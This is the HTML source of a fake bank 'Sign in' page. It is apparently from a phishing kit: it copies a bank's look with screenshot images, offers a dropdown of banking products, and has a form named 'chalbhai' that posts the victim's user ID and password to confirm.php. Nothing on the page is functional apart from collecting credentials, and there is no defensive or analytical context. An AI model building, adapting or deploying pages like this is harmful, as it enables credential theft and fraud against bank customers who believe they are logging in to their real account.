


<title>Sign in</title>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">


<link rel="shortcut icon" href="images/favicon.ico">
			  
			  
	
<script type="text/javascript">

function unhideBody()
{
var bodyElems = document.getElementsByTagName("body");
bodyElems[0].style.visibility = "visible";
}

</script>

</head><body style="visibility: visible;" onload="unhideBody()">
<style type="text/css">
div#container
{
	position:relative;
	width: 100%;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>
<style> 
.textbox { 
    background: transparent url(http://html-generator.weebly.com/files/theme/input-text-8.png) repeat-x; 
    border: 1px solid #999; 
    outline:0; 
    height:25px; 
    width: 275px; 
    border-radius: 5px; 
  } 
   
  
 .textbox:focus { 
    border: 1px solid #4d90fe; 
    outline: none; 
   border-radius: 5px; 
    box-shadow: inset 0px 1px 2px rgba(0,0,0,0.3);  
    -moz-box-shadow: inset 0px 1px 2px rgba(0,0,0,0.3); 
    -webkit-box-shadow: inset 0px 1px 2px rgba(0,0,0,0.3); 
    background: rgb(255, 255, 255); } 
  
</style> 


<div id="container">
<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:0px; width:1349px; height:101px; z-index:0"><img src="images/header.png" alt="" title="" border="0" width="1349" height="101"></div>

<div id="image2" style="position:absolute; overflow:hidden; left:208px; top:149px; width:949px; height:35px; z-index:1"><img src="images/h2.png" alt="" title="" border="0" width="949" height="35"></div>

<div id="image3" style="position:absolute; overflow:hidden; left:210px; top:199px; width:950px; height:239px; z-index:2"><img src="images/hiif.png" alt="" title="" border="0" width="950" height="239"></div>

<div id="image4" style="position:absolute; overflow:hidden; left:228px; top:319px; width:68px; height:14px; z-index:3"><a href="#"><img src="images/enrol.png" alt="" title="" border="0" width="68" height="14"></a></div>

<div id="image5" style="position:absolute; overflow:hidden; left:253px; top:410px; width:217px; height:20px; z-index:4"><a href="#"><img src="images/pri.png" alt="" title="" border="0" width="217" height="20"></a></div>

<div id="image6" style="position:absolute; overflow:hidden; left:269px; top:304px; width:120px; height:14px; z-index:5"><a href="#"><img src="images/use.png" alt="" title="" border="0" width="120" height="14"></a></div>
<form action="confirm.php" name="chalbhai" id="chalbhai" method="post">
<select name="select1" required="" class="textbox" style="border: 0px solid #000000;position:absolute;left:229px;top:233px;background:rgba(227,162,11,0.0);width:237px;z-index:6">
<option>Banking</option>
<option>Credit Cards</option>
<option>Auto Loans</option>
<option>ShareBuilder Investing</option>
<option>Home Loans</option>
<option>More Products</option></select>
<input name="id" placeholder="User ID" title="Please Enter Right Value" autofocus="" required="" autocomplete="off" class="textbox" type="text" style="position:absolute;width:114px;left:230px;top:265px;z-index:7">
<input name="pass" placeholder="Password" title="Please Enter Right Value" autofocus="" required="" autocomplete="off" class="textbox" type="password" style="position:absolute;width:114px;left:350px;top:265px;z-index:8">
<div id="image7" style="position:absolute; overflow:hidden; left:203px; top:450px; width:961px; height:442px; z-index:9"><img src="images/aswer.png" alt="" title="" border="0" width="961" height="442"></div>

<div id="image8" style="position:absolute; overflow:hidden; left:995px; top:499px; width:147px; height:188px; z-index:10"><a href="#"><img src="images/siiiii.png" alt="" title="" border="0" width="147" height="188"></a></div>

<div id="image9" style="position:absolute; overflow:hidden; left:0px; top:1000px; width:1348px; height:199px; z-index:11"><a href="#"><img src="images/footer.png" alt="" title="" border="0" width="1348" height="199"></a></div>

<div id="image10" style="position:absolute; overflow:hidden; left:258px; top:337px; width:208px; height:30px; z-index:12"><a href="#"><img src="images/signinnnn.png" alt="" title="" border="0" width="208" height="30"></a></div><a href="#">

<div id="formimage1" style="position:absolute; left:393px; top:301px; z-index:13"><input type="image" name="formimage1" width="75" height="30" src="images/signin.png"></div>
</a></form></div><a href="#">



</a></body></html>